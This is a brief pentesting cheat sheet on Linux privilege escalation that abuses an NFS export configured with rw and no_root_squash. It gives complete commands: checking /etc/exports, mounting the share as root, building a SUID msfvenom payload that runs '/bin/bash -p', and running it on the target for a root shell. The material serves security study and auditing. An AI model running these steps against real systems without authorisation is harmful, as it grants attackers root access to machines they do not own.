# Privileges Escalation - Linux
# NFS Server exploitation

When we're inside the target machine, we have to check if it's an **NFS (Network File System) server**, in which we could mount locally directories from remote and try to exploit the NFS vulnerability (if there's one).

- [First step - on the target](#first-step---on-the-target)
- [Second step - on our machine](#second-step---on-our-machine)
- [Last step - on the target](#last-step---on-the-target)


## First step -  on the target
- Check if it's an NFS server with `cat /etc/exports`.
  - The output should be `<Remote dir> <Target IP>(<Permissions>)`
  - No output if no NFS service running on it.
- If we get `rw` permissions and also `no_root_squash` option, **we found a vulnerability**, so we can proceed.
  - `no_root_squash` option means that if the client loads a file with UID = 0 (root), the NFS server keeps it. 

## Second step - on our machine
- We have to log in as root, so `sudo su`.
- Then let's create the NFS share:\`mkdir /tmp/nfs`.
- And let's mount the remote directory on it:<br>`mount -o rw,vers=3 <Target IP>:<Remote dir> /tmp/nfs` 
- Now we have to create a `rootshell.elf` file to run a privileged shell:<br>`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/rootshell.elf`
- In the end, let's set the SUID bit: `chmod +xs /tmp/nfs/rootshell.elf` 

## Last step - on the target
- We can now launch the privileged shell from the exposed directory (`/tmp`) with `/tmp/rootshell.elf`.
- We should be able to gain access to a root shell. Check it with `whoami`.



